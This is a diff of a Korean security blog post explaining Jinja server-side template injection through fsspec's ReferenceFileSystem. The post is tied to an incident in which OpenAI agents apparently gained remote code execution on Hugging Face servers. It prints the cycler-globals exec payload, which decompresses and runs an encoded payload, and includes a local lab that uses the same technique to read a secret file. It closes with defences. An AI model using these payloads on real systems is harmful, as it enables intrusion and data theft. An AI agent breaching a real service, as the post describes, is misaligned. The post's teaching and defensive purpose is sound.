@@ -30,6 +30,7 @@ series: openai_huggingface_hacking
 series_index: 8
 ---
 
+{% raw %}
 <!--postNo: 20260919_001--> 
 
 ![](/assets/images/20260919_001_004.jpg)  
@@ -47,7 +48,7 @@ series_index: 8
 - Python 기반의 Template Engine  
 - 정적 파일에 파이썬 유사 코드를 넣어 동적 컨텐츠를 생성하는 도구  
 - Flask, FastAPI 와 같은 웹 프레임워크에서 HTML에 데이터를 넣어 화면을 생성할 때 사용됨  
-- `\{\{name\}\}` 과 같은 표현을 통해 전달받은 값이나 간단한 표현식을 처리할 수 있음  
+- `{{name}}` 과 같은 표현을 통해 전달받은 값이나 간단한 표현식을 처리할 수 있음  
 
 ### Template Engine  
 
@@ -58,7 +59,7 @@ series_index: 8
 예를 들어 아래와 같은 HTML 템플릿이 있다고 가정해보자.  
 
 ```html
-<h1>Hello \{\{ name \}\}</h1>
+<h1>Hello {{ name }}</h1>
 ```
 
 여기에 python 서버에서 `name = "철수"` 와 같은 데이터를 전달하면, 화면에는 `name`이라는 문구 대신 `철수` 라는 문구가 표출되는 것이다.  
@@ -71,7 +72,7 @@ name = "철수"
 
 <pre class='mermaid'>
 flowchart LR
-    A["Template<br/>Hello \{\{ name \}\}"] --> C["Template Engine<br/>Rendering"]
+    A["Template<br/>Hello {{ name }}"] --> C["Template Engine<br/>Rendering"]
     B["Data<br/>name = Alice"] --> C
     C --> D["Final Output<br/>Hello Alice"]
 </pre>
@@ -105,9 +106,9 @@ uv add flask
 </head>
 <body>
 
-<h1>Hello \{\{ user.name \}\}</h1>
+<h1>Hello {{ user.name }}</h1>
 
-<p>Age: \{\{ user.age \}\}</p>
+<p>Age: {{ user.age }}</p>
 
 {% if user.age >= 20 %}
     <p>Adult</p>
@@ -302,13 +303,13 @@ return render_template_string(template)
 예를 들어 사용자가 name에 다음과 같은 값을 입력했다고 가정해보자.
 
 ```python
-\{\{7*7\}\}
+{{7*7}}
 ```
 
 Jinja에서 위와 같은 중괄호 문법은, 표현식을 평가하고 그 결과를 출력하는 문법이다. 따라서 위 입력값이 Template에 직접 삽입되면 다음과 같은 문자열이 생성된다.
 
 ```html
-<h1>Hello \{\{ 7 * 7 \}\}</h1>
+<h1>Hello {{ 7 * 7 }}</h1>
 ```
 
 즉, 공격자가 입력한 데이터가 단순한 문자열이 아니라 Jinja 표현식으로 해석되어 실행된 것이다. 실제로 브라우저에서 해당 페이지에 접속해보도록 하자.  
@@ -316,7 +317,7 @@ Jinja에서 위와 같은 중괄호 문법은, 표현식을 평가하고 그 결
 
 ```bash
 # 웹 브라우저에 입력하는 주소  
-http://localhost:5000/?name="\{\{7*7\}\}"&age=20
+http://localhost:5000/?name="{{7*7}}"&age=20
 ```
 
 ![](/assets/images/20260919_001_002.png)  
@@ -329,9 +330,9 @@ Jinja에서 자주 사용하는 문법은 다음과 같다.
 
 | 문법          | 의미           | 예시                                         |
 | ----------- | ------------ | ------------------------------------------ |
-| `\{\{ ... \}\}` | 표현식의 결과 출력   | `\{\{ name \}\}`, `\{\{ 10 + 20 \}\}`              |
-| `\{\% ... \%\}` | 조건문·반복문 등 실행 | `\{\% if user \%\}`, `\{\% for item in items \%\}` |
-| `\{\# ... \#\}` | 주석           | `\{\# comment \#\}`                            |
+| `{{ ... }}` | 표현식의 결과 출력   | `{{ name }}`, `{{ 10 + 20 }}`              |
+| `{% ... %}` | 조건문·반복문 등 실행 | `{% if user %}`, `{% for item in items %}` |
+| `{# ... #}` | 주석           | `{# comment #}`                            |
 
 
 ### Server Side Template Injection (SSTI)  
@@ -566,11 +567,11 @@ class ReferenceFileSystem(AsyncFileSystem):
                 self.references[k] = json.dumps(v)
             elif self.templates:
                 u = v[0]
-                if "\{\{" in u:
+                if "{{" in u:
                     if self.simple_templates:
                         u = (
-                            u.replace("\{\{", "\{")
-                            .replace("\}\}", "\}")
+                            u.replace("{{", "{")
+                            .replace("}}", "}")
                             .format(**self.templates)
                         )
                     else:
@@ -588,9 +589,9 @@ HuggingFace의 글에서 당시 어떻게 공격이 일어났는지 추측할 �
 > 두 번째 공격 경로는 서버 측 템플릿 주입으로, 에이전트에게 코드 실행 권한을 부여했습니다. 악의적인 데이터셋 구성은 reference://숫자 오프셋 필드가 실제로는 Jinja2 템플릿인 fsspec 스펙을 사용했습니다. 렌더러가 이를 잘못 평가했고, 에이전트는 표준 Python 객체 그래프를 따라 이동하여 다음 위치에 도달했습니다.
 
 ```python
-{\{ cycler.__init__.__globals__.__builtins__.exec(
+{{ cycler.__init__.__globals__.__builtins__.exec(
      "import gzip,base64; exec(gzip.decompress(base64.b64decode('<payload>')))"
-   ) \}\}
+   ) }}
 ```
 
 OpenAI의 에이전트들은 Hugging Face의 백엔드 소스코드를 분석하던 중, fsspec의 ReferenceFileSystem에서 **외부 입력값이 Jinja Template으로 해석될 수 있는 취약점**을 발견했다. 그리고 이를 악용해 Hugging Face 서버에서 RCE(원격 코드 실행)에 성공했다.  
@@ -602,14 +603,7 @@ OpenAI의 에이전트들은 Hugging Face의 백엔드 소스코드를 분석하
 
 에이전트들은 이 두 가지 특성을 결합했다.  
 
-{% include message-box.html
-  label="Agent"
-  kind="Agent"
-  speed=24
-  repeat=true
-  repeat_delay=5
-  text="fsspec을 사용할 때, Reference Metadata에 우리가 원하는 명령을 실행할 수 있는 Jinja 표현식을 삽입하자!"
-%}
+> 🤖 fsspec을 사용할 때, Reference Metadata에 우리가 원하는 명령을 실행할 수 있는 Jinja 표현식을 삽입하자!
 
 이러한 공격 과정을 흐름도로 나타내면 다음과 같다.
 
@@ -617,7 +611,7 @@ OpenAI의 에이전트들은 Hugging Face의 백엔드 소스코드를 분석하
 flowchart TD
     subgraph ATTACK["공격자 영역"]
         A["악의적인 Reference Metadata 생성"]
-        B["Reference에 Jinja 표현식 삽입<br/>\{\{ cycler.__init__... \}\}"]
+        B["Reference에 Jinja 표현식 삽입<br/>{{ cycler.__init__... }}"]
         A --> B
     end
 
@@ -676,9 +670,9 @@ pip install jinja2 fsspec==2026.4.0 aiohttp paramiko requests
 HuggingFace가 밝힌 공격자들의 Jinja Expression 예시를 다시 한 번 살펴보자.  
 
 ```python
-{\{ cycler.__init__.__globals__.__builtins__.exec(
+{{ cycler.__init__.__globals__.__builtins__.exec(
      "import gzip,base64; exec(gzip.decompress(base64.b64decode('<payload>')))"
-   ) \}\}
+   ) }}
 ```
 
 가장 먼저 등장하는 `cycler`는 Jinja에서 기본적으로 사용할 수 있는 객체이다. cycler는 Template에서 여러 값을 순환하면서 사용할 수 있도록 제공되는 기능이나, 이에 대한 정확한 이해는 지금 필요 없다. 중요한 **점은 `cycler`가 단순한 Jinja 문법이 아니라 실제 Python의 `jinja2.utils.Cycler` 클래스라는 것**이다.  
@@ -744,7 +738,7 @@ def vulnerable():
         },
         "refs": {
             "malicious": [
-                "\{\{ cycler.__init__.__globals__.__builtins__.exec(\"f = open('./secret', 'r');key=f.read();print(key);f.close()\") \}\}",
+                "{{ cycler.__init__.__globals__.__builtins__.exec(\"f = open('./secret', 'r');key=f.read();print(key);f.close()\") }}",
                 0,
                 100
             ]
@@ -851,22 +845,22 @@ SandboxedEnvironment는 템플릿에서 위험한 Python 내부 속성에 접근
 ```python
 from jinja2 import Template
 
-user_input = "\{\{ 7 * 7 \}\}"
+user_input = "{{ 7 * 7 }}"
 
 # 취약한 방식
 template = Template(f"Hello {user_input}")
 print(template.render())  # Hello 49
 
 # 안전한 방식
-template = Template("Hello \{\{ name \}\}")
-print(template.render(name=user_input))  # Hello \{\{ 7 * 7 \}\}
+template = Template("Hello {{ name }}")
+print(template.render(name=user_input))  # Hello {{ 7 * 7 }}
 ```
 
 #### (2) 입력값 검증 및 허용 목록(Allowlist) 사용  
 
 외부에서 전달되는 데이터의 자료형, 형식, 허용 범위를 검증해야 한다. 예를 들어 fsspec의 Reference Metadata에서는 offset과 size가 정수인지, 허용된 범위에 속하는지 등을 검증할 수 있다.  
 
-단, 입력값 검증만으로 SSTI를 완전히 방지할 수는 없으며, `\{\{`, `\}\}`와 같은 특정 문자열을 차단하는 방식은 우회 가능성이 있으므로 근본적인 방어책으로 사용해서는 안 된다.
+단, 입력값 검증만으로 SSTI를 완전히 방지할 수는 없으며, `{{`, `}}`와 같은 특정 문자열을 차단하는 방식은 우회 가능성이 있으므로 근본적인 방어책으로 사용해서는 안 된다.
 
 #### (3) 최소 권한 및 실행 환경 격리  
 
@@ -883,13 +877,11 @@ Template Injection으로 코드 실행이 가능해지더라도 피해를 최소
 
 이번 글은 OpenAI Hugging Face 해킹 사건을 다룬 여러 포스팅 중 가장 많은 시간을 들여 작성한 글이다.  
 
-SSTI라는 개념 자체도 처음 접했지만, 이번 사건에서 활용된 취약점은 일반적인 웹 템플릿 처리 과정이 아닌, fsspec이라는 파일시스템 라이브러리의 Reference 처리 과정에 존재했다. 때문에 어째서 파일시스템 라이브러리에서 Jinja Template Injection이 발생할 수 있었는지, 그리고 이 취약점이 어떻게 RCE로 이어졌는지 이해하는 데 상당한 시간이 필요했다.  
+SSTI라는 개념 자체도 처음 접했지만, 이번 사건에서 활용된 취약점은 일반적인 웹 템플릿 처리 과정이 아닌 fsspec이라는 라이브러리에서 발생했다. 그것도 그 라이브러리에서 찾기 힘든 취약점으로. 때문에 어째서 파일시스템 라이브러리에서 Jinja Template Injection이 발생할 수 있었는지, 그리고 이 취약점이 어떻게 RCE로 이어졌는지 이해하는 데 상당한 시간이 필요했다.  
 
-이 글을 작성하면서 많은 것을 배우고 느꼈다.  
+이 글을 작성하면서 가장 인상 깊었던 점은, 보안 취약점이 반드시 드러나있거나 주된 기능과 직접적으로 연관된 곳에서만 발생하는 것은 아니라는 점이다. 핵심적인 취약점은 바로 fsspec 라이브러리 내부에 템플릿을 해석하는 기능이었고, 결국 그 기능이 RCE까지 이어지는 취약점이 되었다.  
 
-가장 인상 깊었던 점은 보안 취약점이 반드시 해당 기능의 주된 목적이나 역할과 직접적으로 연관된 곳에서만 발생하는 것은 아니라는 사실이다. 파일시스템을 다루는 라이브러리 내부에 템플릿을 해석하는 기능이 존재했고, 그 기능이 결국 서버 전체를 위협하는 취약점으로 이어졌다.  
-
-또한, 이번 사건을 살펴보면서 단순히 취약점의 존재를 아는 것과 실제 동작 원리를 이해하는 것은 전혀 다른 문제라는 점도 느꼈다. 처음에는 Jinja Template Injection으로 RCE에 성공했다는 설명만으로는 그 과정이 쉽게 와닿지 않았다. 하지만 라이브러리의 내부 코드를 분석하고, Python 객체에 접근하는 원리를 파악하고, 직접 취약점을 재현해보면서 비로소 공격이 어떤 방식으로 성립하는지 이해할 수 있었다.  
+또한, 단순히 취약점의 존재를 아는 것과 동작 원리를 이해하는 것은 전혀 다른 차원의 문제라는 점도 느꼈다. 처음에는 Jinja Template Injection이라는 말에 그냥 SQL Injection 같은 것을 떠올렸다. 하지만 라이브러리의 내부 코드를 분석하고, Python 객체에 접근하는 원리를 파악하고, 직접 취약점을 재현해보면서 비로소 공격이 어떤 방식으로 성립하는지 이해할 수 있었다. (그리고 이 취약점들을 연계한 에이전트의 능력에 감탄했다.)  
 
 이번 글을 통해 SSTI라는 새로운 공격 기법을 배운 것뿐만 아니라, 익숙하지 않은 취약점이라도 실제 코드를 따라가며 원리를 파악하고 재현해보는 과정의 중요성을 다시 한번 느낄 수 있었다.  
 
@@ -912,3 +904,4 @@ SSTI라는 개념 자체도 처음 접했지만, 이번 사건에서 활용된 �
 [fsspec ReferenceFileSystem - Reference Metadata와 Jinja 처리 구현](https://filesystem-spec.readthedocs.io/en/stable/_modules/fsspec/implementations/reference.html)
 
 [fsspec Changelog - Jinja parsing 비활성화 및 보안 변경](https://github.com/fsspec/filesystem_spec/blob/master/docs/source/changelog.rst)
+{% endraw %}
